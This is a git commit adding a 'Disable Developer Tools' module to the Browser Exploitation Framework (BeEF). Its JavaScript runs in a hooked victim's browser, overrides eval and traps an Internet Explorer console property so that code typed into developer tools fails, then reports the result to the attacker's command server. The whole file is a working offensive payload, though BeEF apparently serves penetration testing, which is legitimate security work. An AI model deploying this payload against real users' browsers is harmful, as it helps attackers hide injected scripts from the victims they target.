49f648c0c77596d59f1746c40d465ec79918136b
Brendan Coles <bcoles@gmail.com>
2015-12-13 22:01:43 +0000

    Add Disable Developer Tools module

---
+++ modules/browser/hooked_domain/disable_developer_tools/command.js
@@ -0,0 +1,33 @@
+//
+// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+  // Uses this technique by KSpace:
+  // http://kspace.in/blog/2013/03/12/ie-disable-javascript-execution-from-console/
+
+  var _eval     = eval,
+      evalError = document.__IE_DEVTOOLBAR_CONSOLE_EVAL_ERROR,
+      flag      = false;
+ 
+  Object.defineProperty( document, "__IE_DEVTOOLBAR_CONSOLE_EVAL_ERROR", {
+    get : function(){
+      return evalError;
+    },
+    set : function(v){
+       flag = !v;
+       evalError = v;
+    }
+  });
+ 
+  eval = function() {
+    if ( flag ) {
+      throw "";
+    }
+    return _eval.apply( this, arguments );
+  };
+
+  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=attempted to disable developer tools");
+});
